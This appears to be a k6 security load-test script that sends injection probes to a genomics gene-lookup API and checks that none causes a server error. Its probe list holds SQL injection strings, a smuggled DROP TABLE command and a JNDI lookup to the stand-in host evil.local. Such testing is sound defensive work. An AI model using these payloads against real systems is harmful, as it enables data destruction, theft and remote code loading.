import http from 'k6/http';
import { check } from 'k6';

const BASE = __ENV.BASE_URL || 'http://127.0.0.1:8080';

export const options = {
  vus: Number(__ENV.VUS || 10),
  duration: __ENV.DURATION || '75s'
};

const PROBES = [
  "' OR 1=1 --",
  '" OR "1"="1',
  'g1; DROP TABLE gene_summary; --',
  '${jndi:ldap://evil.local/a}',
  'chr1:1-10 UNION SELECT * FROM users'
];

export default function () {
  const probe = encodeURIComponent(PROBES[__ITER % PROBES.length]);
  const path = `/v1/genes?release=110&species=homo_sapiens&assembly=GRCh38&gene_id=${probe}&limit=5`;
  const res = http.get(`${BASE}${path}`);

  check(res, {
    'injection attempt does not escalate': (r) => [200, 400, 401, 403, 413, 422, 429, 503].includes(r.status),
    'no 5xx on injection payload': (r) => r.status !== 500
  });
}
